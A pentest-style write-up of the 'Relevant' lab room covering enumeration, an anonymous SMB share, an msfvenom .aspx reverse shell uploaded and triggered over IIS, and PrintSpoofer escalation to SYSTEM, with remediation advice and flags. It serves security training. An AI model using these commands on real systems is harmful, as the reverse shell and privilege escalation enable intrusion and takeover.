# "Relevant" room - pentest report

## Executive summary

The client requested an assessment of the provided virtual environment. Only the IP address 10.10.0.118 was in scope. The results of this assessment show that any attacker is able to discover vulnerabilities in the HTTP and SMB services running on the machine and exploit them to obtain a reverse shell. From there, vulnerabilities in the Windows system allow for quick privilege escalation. 

## Vulnerability assessment

The nt4wrksv SMB share is not password protected. The HTTP service on port 49663 loops back to the SMB share and allows anybody to see files on the share via the browser. Files with the extensions .aspx and .asmx are automatically processed and executed by the application when a user navigates to their respective file paths on the 49663 service in the browser. SeImpersonatePrivilege is enabled on the system. Additionally, winPEAS has found numerous other vulnerabilities. 

## Exploitation assessment

Using the unlocked SMB share to upload a reverse shell in the form of a .aspx file and navigating to its path in the browser on port 49663, the attacker can obtain a reverse shell with a netcat listener. The shell has the privileges of the "iis apppool\defaultapppool" user and has read access to the Bob user's files, leading to the user flag. Serving the PrintSpoofer exploit on the attacker's machine and then downloading and running it on the vulnerable machine, the attacker can obtain root access and read the root flag. 

## Remediation suggestions

First, set a password on all SMB shares as that is where the problems begin. Next, secure the application by filtering for and disallowing serving of .aspx and .asmx files (referring to https://hahndorf.eu/blog/iisfileextensions.html). If the files on the nt4wrksv share are sensitive, such as the file literally named passwords.txt, password protect the HTTP server as well so that the public isn't able to just navigate to the files in the browser. Finally, secure the system. To quote https://github.com/ohpe/juicy-potato: 

> It's nearly impossible to prevent the abuse of all these COM Servers. You could think to modify the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.
> The actual solution is to protect sensitive accounts and applications which run under the * SERVICE accounts. Stopping DCOM would certainly inhibit this exploit but could have a serious impact on the underlying OS.

Finally, download and run the winPEASx64.exe program and fix every CVE and other vulnerabilities it outputs. 

---

Each and every relevant step taken is listed in order as follows:

### nmap scan

```
┌──(root㉿kali)-[~/Downloads/relevant]
└─# cat nmap/initial
# Nmap 7.92 scan initiated Sun Mar  6 20:28:23 2022 as: nmap -vv -A -sV -sC -p- -oN nmap/initial 10.10.0.118
Nmap scan report for 10.10.0.118
Host is up, received echo-reply ttl 125 (0.45s latency).
Scanned at 2022-03-06 20:28:23 EST for 1169s
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-06T01:04:23
| Not valid after:  2022-09-05T01:04:23
| MD5:   3b65 7960 df54 fd34 711b 6b88 d8f8 e14d
| SHA-1: ecbf fc0a 0c26 a746 dcfe afc3 bf78 9bce c730 5862
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQF/VIFzUU1aBNHRb72elUqzANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjAzMDYwMTA0MjNaFw0yMjA5MDUwMTA0
| MjNaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAohqvuWCzMDiBiMnbbP4RRlauEB8vFMUjArKi5JZqXb24NpBQi0yZ
| XHwuZfhAb45Azq9vlGvZ096zBhrjPVS4T1C3mPaRzV9hNZss9TTlrTR2Wty3ugz7
| aHihm/bXPf5iXePmMyZaIvVtmBYEwhaN1CP45KLE/ywaqOTFg2Yei9rDPzAuKXci
| d9BvDb1jleQgsdUXNQeuVP3+WZzbJzUw0FozMHcRBBDM87z2rOuXQdmtgj8w/DQo
| Qe6RXUh1rhFnIcwRurlksF7bzNE8R0hF2+6fJxkWp4ENfPTiikBUdoB+fqOKFUoN
| 1FsxemmmIMGaMfvlzQFsDZdp/P45QI8o7QIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAC2gRSo4o3IQ
| w9CO773N11b+kIzjGYSk7V9XbtYAyfNK/WnYckM53kNYpQfFBY67PZXOJoJVbKmE
| MCuQPmB4WOAMCMej8Yc7lWusun3Q1ZSu2klpVUKYFhhS578GfUEEFqsfoUb9VzDF
| kO83lQipeRhyCU3zq/+M6YPHFoQT97qA6zFTQ5cecoGIsJWSlrNycvuE1g2EOgSy
| sZOXJ1k7pw9vSNv1U8LHb4Y9WzRpgqZIFQLBKSZumsi1zjVHnkPiTTx76RHfeP9r
| Vx52XI9K+lK3tLitiKFrTQVnHKXD4icwMsQ6VhkqXj1bYFft5fWKwfwGSrkbtUMo
| 98Hl57koIds=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-03-07T01:47:08+00:00
|_ssl-date: 2022-03-07T01:47:49+00:00; -3s from scanner time.
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=3/6%OT=80%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=62256448%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=109%TI=I%TS=A)
SEQ(SP=104%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M505NW8ST11%O6=M505ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.031 days (since Sun Mar  6 20:02:52 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m42s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31996/tcp): CLEAN (Timeout)
|   Check 2 (port 18924/tcp): CLEAN (Timeout)
|   Check 3 (port 22832/udp): CLEAN (Timeout)
|   Check 4 (port 42153/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-03-07T01:47:10
|_  start_date: 2022-03-07T01:04:53
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-03-06T17:47:12-08:00

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   171.61 ms 10.4.0.1
2   ... 3
4   529.82 ms 10.10.0.118

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar  6 20:47:52 2022 -- 1 IP address (1 host up) scanned in 1169.24 seconds
```

There are two http services which is interesting. Both are virtually empty with no links or /robots.txt file. Run gobuster in the background to enumerate directories on both http services using directory-list-2.3-small.txt of SecLists. 

The SMB services on ports 139 and 445 are low hanging fruit, so enumeration of those services follows next. 

### enumerate SMB

`smbmap -H 10.10.0.118` returned "Authentication error" but the following two methods worked: 

```
┌──(root㉿kali)-[~]
└─# nmap --script smb-enum-shares.nse -p445,139 10.10.0.118 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 21:30 EST
Nmap scan report for 10.10.0.118
Host is up (0.43s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.0.118\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.0.118\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.0.118\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.0.118\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 109.51 seconds
```

```
┌──(root㉿kali)-[~]
└─# smbclient -L 10.10.0.118              
Enter WORKGROUP\root's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.0.118 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

C$ and IPC$ are standard smb shares and are irrelevant. ADMIN$ definitely requires a password. The last share is the one of interest. 

Using smbclient, the attacker can log in without a password and pull the only file present on the server:

```
┌──(root㉿kali)-[~]
└─# smbclient -U nt4wrksv //10.10.0.118/nt4wrksv
Enter WORKGROUP\nt4wrksv's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar  6 21:32:25 2022
  ..                                  D        0  Sun Mar  6 21:32:25 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

                7735807 blocks of size 4096. 5137767 blocks available
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                            
┌──(root㉿kali)-[~/Downloads/relevant]
└─# cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

The encoding is simply base64 and decodes to:

```
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

I tried to use these credentials to connect via xfreerdp and rpcclient but either these are invalid or my lack of knowledge of these services on ports 3389 and 135 came back to bite me. 

### enumerate web directories

The gobuster scan yielded nothing, so next was to run it again using the directory-list-2.3-medium.txt wordlist. 

`gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.0.118 -t 200`

`gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.0.118:49663 -t 200`

The http service on port 80 yielded nothing, but the 49663 service has one directory at /nt4wrksv — this is the same word as the name of the SMB share with the passwords.txt file. 

`/nt4wrksv             (Status: 301) [Size: 159] [--> http://10.10.0.118:49663/nt4wrksv/]`

Browsing to http://10.10.0.118:49663/nt4wrksv shows the same HTML response as any random directory name which returns a 404: a completely blank page. But browsing to http://10.10.0.118:49663/nt4wrksv/passwords.txt shows the same `cat` output as the passwords.txt from earlier. 

```html
<html>
<head>
<link rel="stylesheet" href="resource://content-accessible/plaintext.css">
</head>
<body>
<pre>[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk</pre>
</body>
</html>
```

It may be that this http directory is a reflection of the SMB share and that the attacker, if they have write access, can put their own file on the SMB server and see it reflected on the http directory. 

### reverse shell

Using a php reverse shell will not work on this Windows IIS server. Uploading a php reverse shell via smbclient and navigating to its path on the target website will only output a 404 error. This error is not present when the extension is changed from php to phtml, indicating that php file types are blocked from being served, but the phtml file still doesn't execute regardless. 

Looking into IIS, it appears that .asmx and .aspx files speak the language of IIS and will be processed when called (source: https://hahndorf.eu/blog/iisfileextensions.html). The attacker can use msfvenom to generate a .aspx payload. 

At first I assumed the Windows system is x86 and specified a payload of windows/shell_reverse_tcp to msfvenom, but this crashed the target. Searching for "x86" and "x64" in the nmap/initial file shows the line `SCAN(V=7.92%E=4%D=3/6%OT=80%CT=%CU=%PV=Y%DS=4%DC=T%G=N%TM=62256448%P=x86_64-pc-linux-gnu)`, the x86_64 indicates an x64 machine. 

So the msfvenom, smbclient, and netcat commands thus are as follows: 

```
┌──(root㉿kali)-[~/Downloads/relevant]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.13.211 LPORT=4444 -f aspx > rsh.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of aspx file: 3408 bytes
                                                                                                            
┌──(root㉿kali)-[~/Downloads/relevant]
└─# smbclient -U nt4wrksv //10.10.0.118/nt4wrksv
Enter WORKGROUP\nt4wrksv's password: 
Try "help" to get a list of possible commands.
smb: \> put rsh.aspx
putting file rsh.aspx as \rsh.aspx (5.9 kb/s) (average 5.9 kb/s)
smb: \> ls
  .                                   D        0  Mon Mar  7 22:21:47 2022
  ..                                  D        0  Mon Mar  7 22:21:47 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  rsh.aspx                            A     3408  Mon Mar  7 22:21:47 2022

                7735807 blocks of size 4096. 4935211 blocks available
smb: \> exit
                                                                                                            
┌──(root㉿kali)-[~/Downloads/relevant]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.13.211] from (UNKNOWN) [10.10.0.118] 49737
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>type \Users\Bob\Desktop\user.txt
type Bob\Desktop\user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
c:\Users>
```

After having navigated to http://10.10.0.118:49663/nt4wrksv/rsh.aspx in the browser, the netcat listener received a connection. The attacker can run commands as the user "iis apppool\defaultapppool" and has read access to the Bob user's directories. That is how the user flag was obtained. 

### privilege escalation

Serving winPEASx64.exe from the attacker machine and then downloading and running it on the target machine, it's clear there are many vulnerabilities that need to be fixed. I recommend for the client to run this program and fix each vulnerability. 

Looking at the output, there are almost a dozen different CVEs and corresponding exploits that can be run. However, the attacker doesn't need to go so far. It doesn't take winPEAS to run `whoami /priv` and see that SeImpersonatePrivilege is enabled. 

I tried to download and run JuicyPotato.exe but the system would delete the file seconds after downloading it from the attacker's machine, probably due to Defender. However, following https://steflan-security.com/linux-privilege-escalation-token-impersonation, I downloaded PrintSpoofer64.exe from https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0 and successfully obtained root privileges by running `.\PrintSpoofer64.exe -i -c cmd`. 

```
PS C:\Windows\Temp> .\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type \Users\Administrator\Desktop\root.txt
type \Users\Administrator\Desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
C:\Windows\system32>
```
